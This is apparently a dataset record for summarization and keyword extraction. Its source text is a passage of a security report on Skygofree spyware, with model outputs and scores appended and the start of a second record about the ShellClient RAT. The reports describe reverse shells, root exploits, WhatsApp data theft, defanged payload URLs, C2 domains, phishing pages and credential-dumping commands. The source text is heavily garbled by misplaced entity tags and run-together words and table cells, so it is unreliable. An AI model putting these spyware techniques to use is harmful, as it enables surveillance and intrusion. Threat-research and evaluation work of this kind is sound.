on a targeted machine . The version we found was built at [DATE] the [DATE] beginning [DATE] of [DATE] 2017 , and at the moment we are not sure whether this implant has been used in the wild . We named the malware [ORG] Skygofree , because we found the word in [CARDINAL] one of the domains*.Malware FeaturesAndroidAccording to the observed samples and their signatures , early versions of this [ORG] Android malware were developed by [DATE] the [DATE] end [DATE] of [DATE] 2014 and thecampaign has remained active ever since . Signature of [CARDINAL] one of the earliest versionsThe code and functionality have changed numerous times ; from simple unobfuscated malware at the beginning to sophisticated multi - stage spyware that gives attackers full remote control of the infected device . We have examined all the detected versions , including the latest one that is signed by a certi\ufb01cate valid from [DATE] September [DATE] 14 , 2017.The implant provides the ability to grab a lot of ex\ufb01ltrated data , like call records , text messages , geolocation , surrounding audio , calendar events , and other memory information stored on the device . After manual launch , it shows a fake welcome noti\ufb01cation to the user : Dear Customer , we \u2019re updating your con\ufb01guration and it will be ready assoon as possible . At the same time , it hides an icon and starts background services to hide further actions from the user . Service NamePurposeAndroidAlarmManagerUploading last recorded .amraudioAndroidSystemServiceAudio recordingAndroidSystemQueuesLocation tracking with movement detectionClearSystemsGSM tracking ( [ORG] CID , LAC , PSC)ClipServiceClipboard stealingAndroidFileManagerUploading all ex\ufb01ltrated dataAndroidPushXMPP [ORG] \u0421&C protocol(url.plus:5223)RegistrationServiceRegistration on [ORG] C&C via HTTP(url.plus / app / pro/)Interestingly , a self - protection feature was implemented in almost every service . Since in Android [CARDINAL] 8.0 ( [ORG] SDK API [CARDINAL] 26 ) the system is able to kill idle services , this code raises a fake update noti\ufb01cation to prevent it : Cybercriminals have the ability to control the implant via HTTP , [GPE] XMPP , binary SMS and FirebaseCloudMessaging ( or GoogleCloudMessaging in older versions ) protocols . Such a diversity of protocols gives the attackers more \ufb02exible control . In the latest implant versions there are [CARDINAL] 48 di\ufb00erent commands . You can \ufb01nd a full list with short descriptions in the [NORP] Appendix . Here are some of the most notable:\u2018geofence \u2019 \u2013 this command adds a speci\ufb01ed location to the implant \u2019s internal database and when it matches a device \u2019s current location the malware triggers and begins to record surrounding audio . \u201d social \u201d \u2013 this command that starts the \u2018 AndroidMDMSupport \u2019 service \u2013 this allows the \ufb01les of any other installed application to be grabbed . The service name makes it clear that by applications the attackers mean [ORG] MDM solutions that are business - speci\ufb01c tools . The operator can specify a path with the database of any targeted application and server - side [ORG] PHP script name for uploading . Several hardcoded applications targeted by the [ORG] MDM - grabbingcommand\u2018wi\ufb01 \u2019 \u2013 this command creates a new Wi - Fi connection with speci\ufb01ed con\ufb01gurations from the command and enable Wi - Fi if it is disabled . So , when a device connects to the established network , this process will be in silent and automatic mode . This command is used to connect the victim to a Wi - Fi network controlled by the cybercriminals to perform tra\ufb03c sni\ufb03ng and man - in - the - middle ( MitM ) attacks.addWi\ufb01Con\ufb01g method code fragments\u2018camera \u2019 \u2013 this command records a video / capture a photo using the front - facing camera when someone next unlocks the device . Some versions of the [ORG] Skygofree feature the self - protection ability exclusively for [ORG] Huawei devices . There is a \u2018 protected apps \u2019 list in this brand \u2019s smartphones , related to a battery - saving concept . Apps not selected as protected apps stop working once the screen is o\ufb00 and await re - activation , so the implant is able to determine that it is running on a [ORG] Huawei device and add itself to this list . Due to this feature , it is clear that the developers paid special attention to the work of the implant on [ORG] Huawei devices . Also , we found a debug version of the implant constants , including the version of the spyware . Debug BuildCon\ufb01g with the versionAfter a deep analysis of all discovered versions of [ORG] Skygofree , we made an approximate timeline of the implant \u2019s evolution . Mobile implant evolution timelineHowever , some facts indicate that the APK samples from stage two can also be used separately as the \ufb01rst step of the infection . Below is a list of the payloads used by the [ORG] Skygofree implant in the [ORDINAL] second and [ORDINAL] third stages . Reverse shell payloadThe reverse shell module is an external [ORG] ELF \ufb01le compiled by the attackers to run on [ORG] Android . The choice of a particular payload is determined by the implant \u2019s version , and it can be downloaded from the command and control ( [ORG] C&C ) server soon after the implant starts , or after a speci\ufb01c command . In the most recent case , the choice of the payload zip \ufb01le depends on the device process architecture . For now , we observe [CARDINAL] only [CARDINAL] one payload version for following the ARM CPUs : arm64 - v8a , armeabi , armeabi - v7a . Note that in almost all cases , this payload \ufb01le , contained in zip archives , is named \u2018 setting \u2019 or \u2018 setting.o\u2019 . The main purpose of this module is providing reverse shell features on the device by connecting with the [ORG] C&C server \u2019s socket . Reverse shell payloadThe payload is started by the main module with a speci\ufb01ed host and port versions : Alternatively , they could be hardcoded directly into the payload code : We also observed variants that were equipped with similar reverse shell payloads directly in the main [ORG] APK /lib/ path . Equipped reverse shell payload with speci\ufb01c stringAfter an in - depth look , we found that some versions of the reverse shell payload code share similarities with PRISM \u2013 a stealth reverse shell backdoor that is available on [GPE] Github . Reverse shell payload from update_dev.zipExploit payloadAt the same time , we found an important payload binary that is trying to exploit several known vulnerabilities and escalate privileges . According to several timestamps , this payload is used by implant versions created since [DATE] 2016 . It can also be downloaded by a speci\ufb01c command . The exploit payload contains following \ufb01le components : Component nameDescriptionrun_root_shell / arrs_put_user.o / arrs_put_user / pocExploit ELFdbdevice.dbSqlite3 toolELFSqlite3 escalation\u2018device.db \u2019 is a database used by the exploit . It contains [CARDINAL] two tables \u2013 \u2018 supported_devices \u2019 and \u2018 device_address \u2019 . The \ufb01rst table contains [CARDINAL] 205 devices with some Linux properties ; the [ORDINAL] second contains the speci\ufb01c memory addresses associated with them that are needed for successful exploitation . You can \ufb01nd a full list of targeted models in the [NORP] Appendix . Fragment of the database with targeted devices and speci\ufb01c memoryaddressesIf the infected device is not listed in this database , the exploit tries to discover these addresses programmatically . After downloading and unpacking , the main module executes the exploit binary \ufb01le . Once executed , the module attempts to get root privileges on the device by exploiting the following vulnerabilities : CVE-2013 - 2094 CVE-2013 - 2595 CVE-2013 - 6282 CVE-2014 - 3153 ( futex aka [PRODUCT] TowelRoot ) CVE-2015 - 3636Exploitation processAfter an in - depth look , we found that the exploit payload code shares several similarities with the public project android - rooting - tools . Decompiled exploit function code fragmentrun_with_mmap function from the android - rooting - tools projectAs can be seen from the comparison , there are similar strings and also a unique comment in [NORP] Italian , so it looks like the attackers created this exploit payload based on android - rooting - tools project source code . [PERSON] Busybox payloadBusybox is public software that provides several Linux tools in a single [ORG] ELF \ufb01le . In earlier versions , it operated with shell commands like this : Stealing [ORG] WhatsApp encryption key with [ORG] BusyboxSocial payloadActually , this is not a standalone payload \ufb01le \u2013 in all the observed versions its code was compiled with exploit payload in one \ufb01le ( \u2018 poc_perm \u2019 , \u2018 arrs_put_user \u2019 , \u2018 arrs_put_user.o \u2019 ) . This is due to the fact that the implant needs to escalate privileges before performing social payload actions . This payload is also used by the earlier versions of the implant . It has similar functionality to the \u2018 AndroidMDMSupport \u2019 command from the current versions \u2013 stealing data belonging to other installed applications . The payload will execute shell code to steal data from various applications . The example below steals Facebook data : All the other hardcoded applications targeted by the payload : Package nameNamejp.naver.line.androidLINE : [ORG] Free [ORG] Calls [ORG] & Messagescom.facebook.orcaFacebook [ORG] messengercom.facebook.katanacom.whatsappcom.viber.voipFacebookWhatsAppViberParser payloadUpon receiving a speci\ufb01c command , the implant can download a special payload to grab sensitive information from external applications . The case where we observed this involved [ORG] WhatsApp . In the examined version , it was downloaded from : hxxp://url[.]plus / Updates / tt / parser.apkThe payload can be a .dex or .apk \ufb01le which is a [PERSON] Java - compiled [ORG] Android executable . After downloading , it will be loaded by the main module via DexClassLoader api : As mentioned , we observed a payload that exclusively targets the [ORG] WhatsApp messenger and it does so in an original way . The payload uses [ORG] the [ORG] Android [ORG] Accessibility [ORG] Service to get information directly from the displayed elements on the screen , so it waits for the targeted application to be launched and then parses all nodes to \ufb01nd text messages : Note that the implant needs special permission to use [ORG] the [ORG] Accessibility [ORG] Service [ORG] API , but there is a command that performs a request with a phishing text displayed to the user to obtain such permission . WindowsWe have found multiple components that form an entire spyware system binary \ufb01les via the Py2exe tool . This sort of conversion allows Python code to be run in a Windows environment without pre - installed Python binaries.msconf.exe is the main module that provides control of the implant and reverse shell feature . It opens a socket on the victim \u2019s machine and connects with a server - side component of the implant located at malware environment in \u2018 APPDATA / myupd \u2019 and creates a sqlite3 database there \u2013 \u2018 myupd_tmp\\\\mng.db\u2019:CREATE TABLE MANAGE(ID INT PRIMARY KEY NOT NULL , [PERSON] Send [PERSON] INT NOT NULL , [PERSON] Keylogg [PERSON] INT NOT NULL , Screenshot INT NOT NULL , [PERSON] Audio [PERSON] INT NOT NULL ) ; [ORG] INSERT [ORG] INTO [ORG] MANAGE ( ID , Send , Keylogg , Screenshot , [PERSON] Audio ) VALUES ( [CARDINAL] 1 , [CARDINAL] 1 , [CARDINAL] 1 , [CARDINAL] 1 , 0 ) Finally , the malware modi\ufb01es the \u2018 Software\\Microsoft\\Windows\\CurrentVersion\\Run \u2019 registry key to enable autostart of the main module . The code contains multiple comments in [NORP] Italian , here is the most noteworthy example:\u201cReceive commands from the remote server , here you can set the keycommands to command the virus\u201dHere are the available commands : NamecdquitnggexeDescriptionChange current directory tospeci\ufb01edClose the socketExecute received command via Python \u2019s subprocess . Popen()without outputsngguploadsUpload speci\ufb01ed \ufb01le to the speci\ufb01edURLDownload content from thenggdownloadsspeci\ufb01ed URLs and save to speci\ufb01ed\ufb01lengg\ufb01lesystemDump \ufb01le structure of the C : path , save it to the \ufb01le in json format andzip itnggstart_screen nggstop_screenEnable / disable screenshot module . When enabled , it makes ascreenshot every [CARDINAL] 25 secondsnggstart_key nggstop_keynggstart_rec nggstop_recngg_status*any other*Enable / disable keylogging moduleEnable / disable surrounding soundsrecording moduleSend components status to the [ORG] C&CsocketExecute received command viaPython \u2019s subprocess . Popen ( ) , outputresult will be sent to the C&Csocket . All modules set hidden attributes to their \ufb01les : ModulePathsEx\ufb01ltrated data formatmsconf.exe%APPDATA%/myupd / gen/%H%M%S_\ufb01lesystem.zip ( \ufb01le%Y%m%d - system.exe%APPDATA%/myupd / aud / structure dump)%d%m%Y%H%M%S.wav ( surrounding sounds)update.exe%APPDATA%/myupd_tmp / txt/%Y%m%d-%H%M%S.txt%APPDATA%/myupd / txt/(keylogging)wow.exe%APPDATA%/myupd / scr / skype_sync2.exe%APPDATA%/myupd_tmp / skype/%APPDATA%/myupd / skype/%Y%m%d-%H%M%S.jpg(screenshots)yyyyMMddHHmmss_in.mp3 yyyyMMddHHmmss_out.mp3(skype calls records)Moreover , we found one module written in .Net \u2013 skype_sync2.exe . The main purpose of this module is to ex\ufb01ltrate [ORG] Skype call recordings . Just like the previous modules , it contains multiple strings in [NORP] Italian . After launch , it downloads a codec for MP3 encoding directly from the and the following PDB string:\\\\vmware - host\\Shared Folders\\dati\\Backup\\Projects\\REcodin_2\\REcodin_2\\obj\\x86\\Release\\REc odin_2.pdbnetwork.exe is a module for submitting all ex\ufb01ltrated data to the server . In the observed version of the implant it does n\u2019t have an interface to work with the skype_sync2.exe module.network.exe submitting to the server code snippetCode similaritiesWe found some code similarities between the implant for Windows and other public accessible projects.url appears the developers have copied the functional part of the keylogger module from this project.update.exe module and Keylogger by \u2018 El3ct71k \u2019 code comparisonXenotix Python Keylogger including speci\ufb01ed mutex con\ufb01gurazione / vodafone/ smartphone / Vodafone%20Con\ufb01guratore.apkurl\ufb01nity.syt es.net/tim/internet/Con\ufb01guratore_TIM.apkurl\ufb01nity.syt es.net/190/con\ufb01gurazione /vodafone / smartphone / V ODAFONE%20Con\ufb01guratore%20v5_4_2.apkurl con\ufb01gurazione / vodafone / smartphone / index.html2015 - 01 - 20 to con\ufb01gurazione / vodafone / smartphone / index.htmlcurrently activeurl\ufb01nity.sytes.net/tim/internet/2015-03-04url\ufb01nity.syt es.net/190/con\ufb01gurazione /vodafone / smartphone/2015 - 01 - 14url\ufb01guratore%20v5_4_2.apkurl\ufb01guratore_TIM.apkwnload.html2015 - 02 - 04 2015 - 07 - 202015 - 07 - 08Many of these domains are outdated , but almost all ( except one \u2013 accessible . All the observed landing pages mimic the mobile operators \u2019 web pages through their domain name and web page content as well . Landing web pages that mimic the [FAC] Vodafone and [CARDINAL] Three mobile operatorsitesNETWORK CONFIGURATION * * AGG . [CARDINAL] 2.3.2015 * * * Dear Customer , in order to avoid malfunctions to your internet connection , we encourage you to upgrade your con\ufb01guration . Download the update now and keep on navigating at maximum speed ! [LAW] DOWNLOAD [LAW] NOW Do you doubt how to con\ufb01gure your smartphone ? Follow the simple steps below and enter the Vodafone Click on the [ORG] DOWNLOAD button you will \ufb01nd on this pageand download the application on your smartphone . Set your Smartphone Go to Settings- > Security for your device and put a check mark on [ORG] Unknown [ORG] Sources ( some models are called Go to noti\ufb01cations on your device ( or directly in the Downloads folder ) and click [ORG] Vodafone [ORG] Con\ufb01guration [ORG] Update to install . Try high speed Restart your device and wait for con\ufb01rmation sms . Your smartphone is now con\ufb01gured . Further research of the attacker \u2019s infrastructure revealed more related mimicking domains . Unfortunately , for now we ca n\u2019t say in what environment these landing pages were used in the wild , but according to all the information at our dsiposal , we can assume that they are perfect for exploitation using malicious redirects or man - in - the - middle attacks . For example , this could be when the victim \u2019s device connects to a Wi - Fi access point that is infected or controlled by the attackers . ArtifactsDuring the research , we found plenty of traces of the developers and those doing the maintaining . As already stated in the \u2018 malware features \u2019 part , there are multiple giveaways in the code . Here are just some of them : ngglobal \u2013 FirebaseCloudMessaging topic nameIssuer : CN = negg \u2013 from several certi\ufb01catesnegg.ddns[.]net , negg1.ddns[.]net , negg2.ddns[.]net \u2013 [ORG] C&C [ORG] serversNG SuperShell \u2013 string from the reverse shell payloadngg \u2013 pre\ufb01x in commands names of the implant forWindowsSignature with speci\ufb01c issuerWhois records and [ORG] IP relationships provide many interesting insights as well . There are a lot of other \u2018 Negg \u2019 mentions in [GPE] Whois records and references to it . For example : [ORG] ConclusionsThe Skygofree Android implant is one of the most powerful spyware tools that we have ever seen for this platform . As a result of the long - term development process , there are multiple , exceptional capabilities : usage of multiple exploits for gaining root privileges , a complex payload structure , never - before - seen surveillance features such as recording surrounding audio in speci\ufb01ed locations . Given the many artifacts we discovered in the malware code , as well as infrastructure analysis , we are pretty con\ufb01dent that the developer of the [ORG] Skygofree implants is an [NORP] Italian IT company that works on surveillance solutions , just like [ORG] HackingTeam . Notes*Skygofree has no connection to [WORK_OF_ART] Sky , Sky Go or any other subsidiary of [ORG] Sky , and does not a\ufb00ect the Sky Go service or app . Skygofree Appendix \u2014 Indicators of Compromise ( PDF)GOOGLE ANDROID HACKING [ORG] TEAMShare post on : MOBILE MALWARERelated Posts\uf09a \uf0d5 \uf099Jack of all Review of the Year 2017", "generated_text": "the document; the advent; Android spyware; Skygofree; first; 2014; features; audio; video; Settings; control; data; AndroidItalian; Italy; the implant; the attackers; use; new features; WhatsApp; accessibility services; a certificate; September 14; the malware; a variety; protocols; control; the latest versions; 48; commands; Gmail; Facebook; Google; the Android malware; versions; the wild; the date; the investigation.", "ref_text": "<START-1>The PDF describes new Android spyware called Skygofree that was discovered in October 2017. The malware has been under development since late 2014 and has evolved over time to include sophisticated surveillance capabilities. Some key features of Skygofree: - Can record audio when the infected device is in a specified location. - Can steal WhatsApp messages via Accessibility Services. - Can connect the infected device to attacker-controlled WiFi networks. - Allows exfiltration of extensive data like call records, texts, location, surrounding audio, calendar, and more. - Uses multiple protocols for command and control, giving flexible control options. - Self-protection mechanisms to prevent removal. - Exploits multiple vulnerabilities to gain root access. - Windows version found that can record Skype calls, keystrokes, take screenshots, etc. The malware has an Italian nexus, with Italian language artifacts in the code and infrastructure. The developers appear to be an Italian surveillance company similar to HackingTeam. The Android malware has been distributed via landing pages mimicking mobile network operators. In summary, Skygofree is powerful, flexible Android spyware that has been continuously developed over multiple years and has some advanced surveillance capabilities. It appears to originate from an Italian developer likely involved in surveillance work. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4566929133858268, "gpt3/lexical/rouge_rouge2": 0.09498680738786279, "gpt3/lexical/rouge_rougeL": 0.21522309711286092, "gpt3/lexical/rouge_rougeLsum": 0.21522309711286092, "gpt3_generated_text": ["The article discusses the discovery of new Android spyware called Skygofree, which has features that were previously unseen in the wild. The researchers believe that the initial versions of this malware were created in 2014 and have since been continuously improving and implementing new features. Some of the notable features include the ability to record audio surroundings, steal WhatsApp messages, and connect to Wi-Fi networks controlled by cybercriminals. The researchers also found several spyware tools for Windows that exfiltrate sensitive data on targeted machines. The Android malware has gone through various changes and now gives attackers full remote control of the infected device. The implant can gather a lot of exfiltrated data, such as call records, text messages, geolocation, and calendar events. It also has a self-protection feature and can be controlled via various protocols. The latest versions of the implant have 48 different commands. The researchers observed that the distribution campaign for Skygofree was most active in 2015, with several infected individuals exclusively in Italy. The investigation also uncovered spyware tools for Windows, although it is unclear if they have been used in the wild."]}, {"split_name": "test", "sample_id": "test_86", "prompt_text": "Extract the keywords: Operation GhostShell : Novel RAT Targets Global Aerospace and Telecoms [DATE] Firmscybereason.com/blog/operation-ghostshell-novel-rat-targets-global-aerospace-and-telecoms-firmsOctober 6 , [DATE] 2021 | [TIME] 16 [TIME] minute readIn [DATE] July [DATE] 2021 , [ORG] the [ORG] Cybereason [ORG] Nocturnus and Incident Response Teams responded to [ORG] Operation [ORG] GhostShell , a highly - targeted cyber espionage campaign targeting the [ORG] Aerospace [ORG] and [ORG] Telecommunications industries mainly in [LOC] the [LOC] Middle [LOC] East , with additional victims in the [GPE] U.S. , [GPE] Russia and [LOC] Europe . The [ORG] Operation [ORG] GhostShell campaign aims to steal sensitive information about critical assets , organizations \u2019 infrastructure and technology . During the investigation , [ORG] the [ORG] Nocturnus [ORG] Team uncovered a previously undocumented and stealthy [ORG] RAT ( Remote Access Trojan ) dubbed ShellClient which was employed as the primary espionage tool . [ORG] The [ORG] Nocturnus [ORG] Team found evidence that the ShellClient RAT has been under ongoing development since [DATE] at [DATE] least [DATE] 2018 , with several iterations that introduced new functionalities , while it evaded antivirus tools and managed to remain undetected and publicly unknown . Assessments as to the identity of the operators and authors of [ORG] ShellClient resulted in the identification of a new [NORP] Iranian threat actor dubbed [ORG] MalKamak that has operated since [DATE] at [DATE] least [DATE] 2018 and remained publicly unknown thus far . In addition , our research points out possible connections to other [NORP] Iranian state - sponsored [ORG] APT threat actors such as [PERSON] Chafer [PERSON] APT ( APT39 ) and [PERSON] Agrius [PERSON] APT . However , we assess that [ORG] MalKamak has distinct features that separate it from the other [NORP] Iranian groups . Key FindingsNew [NORP] Iranian Threat Actor [PERSON] MalKamak : A newly discovered [NORP] Iranian threat actor dubbed [ORG] MalKamak that has been operating since [DATE] at [DATE] least [DATE] 2018 and remained unknown thus far . In addition , the investigation draws possible connections to other [NORP] Iranian state - sponsored threat actors including [PERSON] Chafer [PERSON] APT ( APT39 ) and Agrius APT.Discovery of New ShellClient RAT : The [ORG] Cybereason [ORG] Nocturnus team discovered a sophisticated and previously undocumented [ORG] RAT ( [ORG] Remote [ORG] Access [ORG] Trojan ) dubbed ShellClient used for highly targeted cyber espionage operations.1/20Targeting Aerospace and Telecom Companies : Based on the telemetry , this threat has been predominantly observed in [LOC] the [LOC] Middle [LOC] East region , but has also been observed targeting organizations in the [GPE] U.S. , [GPE] Russia and [LOC] Europe , with a focus on the [ORG] Aerospace [ORG] and [ORG] Telecommunications industries . [ORG] Ongoing [ORG] Development Since [DATE] 2018 : Our investigation revealed this threat was [ORDINAL] first operationalized in [DATE] 2018 , and since then has been under active development with each new version adding more features and stealth . This threat is still active as of September 2021.Abusing Cloud Services for C2 : The most recent ShellClient versions were observed to be abusing cloud- based storage services for [ORG] Command and Control ( C2 ) , in this case the popular Dropbox service , in order to remain undetected by blending in with legitimate network traffic . Designed for Stealth : The authors of [ORG] ShellClient invested a lot of effort into making it stealthy to evade detection by antivirus and other security tools by leveraging multiple obfuscation techniques and recently implementing a [ORG] Dropbox client for command and control ( C2 ) , making it very hard to detect . ShellClient : The Silent RATThe following sections recap the recently observed [ORG] Operation [ORG] GhostShell campaign and the evolution of this stealthy ShellClient RAT , which has been operationalized and actively developed since [DATE] at [DATE] least [DATE] November [DATE] 2018.Recent CampaignIn [DATE] July [DATE] 2021 , [PERSON] Cybereason encountered an unidentified threat actor carrying out a cyber espionage operation using a previously undocumented and stealthy RAT dubbed ShellClient . Using this [ORG] RAT , the threat actors were [ORDINAL] first observed conducting reconnaissance and the exfiltration of sensitive data from leading [ORG] Aerospace [ORG] and [ORG] Telecommunications companies in [LOC] the [LOC] Middle [LOC] East region , and was later observed targeting the same industries in other regions including the [GPE] U.S , [GPE] Russia and [LOC] Europe . When [ORDINAL] first inspecting the ShellClient RAT , the malicious binary was found to be running on victim machines as \u201c svchost.exe \u201d while its internal name was disguised as \u201c RuntimeBroker.exe\u201d:ShellClient RAT internal name masquerades as a legitimate Microsoft RuntimeBroker.exe binaryThis executable was determined to have been compiled on [DATE] May 22nd , [DATE] 2021 , and was observed to be executing adjacent to additional TTPs . ShellClient Structure and [ORG] ConfigurationThe [ORG] ShellClient RAT is a modular [ORG] PE leveraging [ORG] Costura to compress each of the modules using zlib:2/20ShellClient RAT utilizing [CARDINAL] CosturaTwo of the references are DLLs containing supporting functionalities : [CARDINAL] ExtensionLib.dll contains utilities and functionalities such as : [ORG] AES [ORG] Encryption , including an AES Key and an [ORG] Initialization [ORG] Vector ( IV ) SerializationExtensionLib.dllClientCore.dll holds other core functionalities of the the client such as : Fingerprinting Settings & Strings3/20ClientCore.dllThe executable stores most of the its strings , including configuration strings , as bytes and then converts them in real - time to Unicode / ASCII to evade antivirus strings detection : ShellClient using Unicode / ASCII to evade antivirus strings detectionExecution [ORG] Flow4/20The [ORG] ShellClient RAT executes according to the following arguments : If no arguments are provided , the binary executes itself using InstallUtil.exe to install and run a malicious [ORG] nhdService service If there is [CARDINAL] one argument and it is equal to -c , the binary will be executed using the Service Control Manager ( SCM ) to create a reverse shell , communicating with a configured Dropbox storage as a [ORG] C2If there is [CARDINAL] one argument and it is equal to -d , the binary will execute as a regular processShellClient [ORG] RAT argumentsWhen either of the -c or -d arguments are provided , the malware performs basic fingerprinting using [ORG] WMI to collect : Hardware information such as [ORG] BIOS information , [PERSON] Mac address , etc . Networking Information including a request to ipinfo[.]io / ip to retrieve the public [ORG] IP address of the infected machine Which antivirus products are installedThe abovementioned collected information is also used to create a unique agent identifier for each infected machine : Creating a unique identifierCommand and Control ( C2 ) CommunicationsThe [CARDINAL] C2 communications this malware implements are quite unique , as they rely on \u201c cold files \u201d being saved to a remote Dropbox , instead of a common interactive session . This method of communication is an interesting [ORG] Operational [ORG] Security ( OPSEC ) solution , making it difficult to trace the threat actor \u2019s infrastructure by utilizing a public service such as [ORG] Dropbox . To communicate with [ORG] Dropbox , [ORG] ShellClient uses Dropbox \u2019s API with a unique embedded API key . Before communicating , it encrypts the data using an hardcoded AES encryption key . The [ORG] Dropbox storage contains [CARDINAL] 3 folders : AS Folder ( Agents Folder ): Stores uploaded information on infected machines [ORG] CS [ORG] Folder ( Commands Folder ): Stores commands to be fetched , executed and then deleted by [ORG] ShellClient [ORG] RS [ORG] Folder ( Results Folder ): Stores the output of commands executed by ShellClient5/20Every 2 seconds , the victim machine checks the commands folder , retrieves files that represent commands , parses their content , then deletes them from the remote folder and enables them for execution : ShellClient C2 CommunicationsAfter executing the commands , the executable uploads the results to the corresponding folder with a randomly generated file name based on the unique victim ID that the threat actor calls as HardwareID : ShellClient C2 CommunicationsThe destinations for these communications will be api.dropboxdapi[.]com and content.dropboxapi[.]com . Persistence and Privilege EscalationThe ShellClient RAT achieves persistence and privilege escalation to run with SYSTEM privileges on victim machines by creating the [ORG] nhdService disguised as [ORG] Network [ORG] Hosts [ORG] Detection [ORG] Service : Service Name : nhdService Display Name : [ORG] Network [ORG] Hosts [ORG] Detection [ORG] Service Description : Searches and manages hosts in the [ORG] Network and Dial - Up [ORG] Connections folder , where both local area network and remote connections are viewable Start Type : Automatic Account : LocalSystemSupported Commands6/20The executable contains multiple command functions that enable its capabilities , including arbitrary command execution , [ORG] FTP / [ORG] Telnet clients , lateral movement , file manipulation , etc . In addition , the malware contains several command functions that seem to do nothing and have no reference in the code ; this could indicate that the malware is still under development . The following table describes the purpose of each command : Command Descriptioncode10Query hostname , malware version , executable path , [ORG] IP address and [ORG] Antivirus [ORG] productscode11Execute an updated version of ShellClientcode12Self delete using [ORG] InstallUtil.execode13Restart the ShellClient servicecode20Start a [ORG] CMD shellcode21Start a [ORG] PowerShell shellcode22Add to the results message the following line : \u201c [ORG] Microsoft [ORG] Windows [ORG] Command [ORG] Prompt [ORG] Alternative [ORG] Started \u2026 \u201d code23Open a [ORG] TCP Clientcode24Start a [ORG] FTP clientcode25Start a Telnet clientCode26Execute a shell commandcode29Kill active [ORG] CMD or [ORG] PowerShell shellcode31Query files and directoriescode32Create a Directorycode33Delete files and folderscode34Download a file to the infected machinecode35Upload a File to Dropboxcode36Does nothingcode37Download a file to the infected machine and execute itcode38Lateral movement using WMI7/20ShellClient C2 CommandsAdditional TTPs Observed with ShellClientUsing the ShellClient RAT , the threat actor deployed additional tools to perform various activities to support their operation such as reconnaissance , lateral movement , data collection and more . Lateral [ORG] MovementThe attackers were observed using [ORG] PAExec and \u201c net use \u201d for lateral movement . [ORG] PAExec is a redistributable version of the famous Sysinternals PsExec , with some additional options . The attackers leveraged PAExec to : Execute a [ORG] CMD shell as SYSTEM on remote machines [ORG] Perform remote service related operations like start , stop , restart , status and more Exfiltrate organizational Active Directory structure using a remotely executed csvde.exe -f < output file > command Check internet connectivity using ping to reach [ORG] Google.com [ORG] Gather host information by executing ipconfig , tasklist and net useShellClient leveraging [ORG] PAExec as observed in [ORG] the [ORG] Cybereason [ORG] Defense [ORG] PlatformCredential [ORG] Dumping ToolDuring the observed attacks , the ShellClient RAT activity group deployed and executed an unknown executable named lsa.exe to perform credential dumping . Lsa.exe dumped the memory of lsass.exe to a file named [PERSON] debug.bin and was observed executing with the following command - line arguments : lsa.exe -dlsa.exe -mAlthough the [ORG] Cybereason [ORG] Nocturnus team was unable to retrieve the lsa.exe executable , we speculate the tool might be a variation of the tool [ORG] SafetyKatz based on the debug.bin dump file the tool creates , which is also the name of the dump file created by [ORG] SafetyKatz that was previously tied to [NORP] Iranian threat actors:8/20ShellClient credential dumping as observed in the Cybereason Defense PlatformStagingIn order to exfiltrate data , the attackers used WinRar to compress important files before data exfiltration using a renamed rar.exe [PRODUCT] WinRar [PRODUCT] file:9/20ShellClient using WinRar to compress data before [WORK_OF_ART] exfiltrationThe [WORK_OF_ART] Evolution [WORK_OF_ART] of [WORK_OF_ART] ShellClient [WORK_OF_ART] and [WORK_OF_ART] Finding [WORK_OF_ART] the [WORK_OF_ART] Missing [WORK_OF_ART] LinkKnown [WORK_OF_ART] ShellClient RAT version history timelineOne of the questions that came up during the investigations was regarding how far back the use of the malware can be observed . At [ORDINAL] first it was thought to have been developed recently since there was no publicly available documentation or any mention of it available . However , the code indicates that the sample we analyzed was version [CARDINAL] 4.0 , which implies there should be several previous versions . With that in mind , the investigation revealed the missing link in a .NET GUID that appeared in the metadata of the observed sample . Pivoting on this unique identifier , we were able to uncover an older instance ( version [CARDINAL] 3.1 , [GPE] VT link ) that used the same .NET TypeLibID GUID , a unique ID generated by [PERSON] Visual [PERSON] Studio per project - fd01304b-571f-4454 - b52b-19cfb8af44a9 : Shared .NET TypeLib I d GUID between the recent and the older version of ShellClientFrom there , finding the other previous versions of [ORG] ShellClient was achieved by pivoting searching for string and code similarities . This pivoting process proved that [ORG] ShellClient has been under continuous development since [DATE] at [DATE] least [DATE] November [DATE] of [DATE] 2018 , marking [DATE] almost [DATE] three [DATE] years of development work to evolve the malware from a simple standalone reverse shell to a stealthy modular espionage tool . In each new iteration of the malware , the authors added new features and capabilities , attempting to use various exfiltration protocols and methods , such as using an [ORG] FTP client and a [ORG] Dropbox account to hide in plain site . In addition , from version [CARDINAL] 4.0.0 and up , the authors made significant design and architecture changes like introducing modular design . Below is a summary of the variants that were discovered so far : [GPE] VT DatePDB Path10/20VT linkEarliestsvchost.exevariant2018 - 11 - 06 21:35:412018 - 11 - 11 23:41:152020 - 04 - 15 23:22:13D:\\projects\\07 - Reverse Shell\\ShellClientServer_HTTP\\obj\\Release\\svchost.pdb2018 - 12 - 16 11:19:142020 - 04 - 14 22:59:49E:\\Projects ( Confidential)\\07 - Reverse Shell\\ShellClientServer_HTTP.v2\\obj\\Release\\svchost.pdb2019 - 01 - 12 18:37:202019 - 01 - 17 22:53:43D:\\Visual [PERSON] Studio 2017\\v3.1\\ShellClient\\obj\\Release\\svchost.pdbRuntimeBroker.exe / svchost.exe2021 - 08 - 10 11:14:512021 - 09 - 22 09:18:59RuntimeBroker.exe / svchost.exe2021 - 05 - 22 12:06:052021 - 07 - 20 16:16:06Known ShellClient RAT version historyOverview of ShellClient EvolutionEarliest Variant ( [DATE] November 2018)The earliest variant traced was compiled on [DATE] November 06 , [DATE] 2018 , and was purposefully named svchost.exe to allow it to masquerade as a legitimate Windows binary . This early variant is not very rich in features and lacks the sophistication and functionality that are manifested in its successors . In essence , it is a rather simple reverse shell . [ORG] Main [ORG] Features : File name : svchost.exeFile description : [ORG] Windows [ORG] Defender ServiceCore functionality : Simple websocket - based reverse shell Hardcoded C2 domain : azure.ms - tech[.]us:80Variant V1 ( November 2018)The [ORDINAL] second oldest variant emerged [DATE] about [DATE] 3 [DATE] weeks after the initial version . This variant is more mature and contains capabilities of both of a client and a server , including a new service persistence method disguising as a [ORG] Windows [ORG] Defender [ORG] Update service . This version of [ORG] ShellClient also communicates with the following C2 domain : azure.ms - tech[.]us:80Main Updates : File description : Host Process For Windows ProcessesCore functionalities : [PERSON] Predefined set of [CARDINAL] C2 commands Executing arbitrary commands via CMD shell or [ORG] PowerShell [ORG] Client and [ORG] Server components [ORG] Persistence via [ORG] Windows [ORG] Service , masquerading as [PRODUCT] Windows 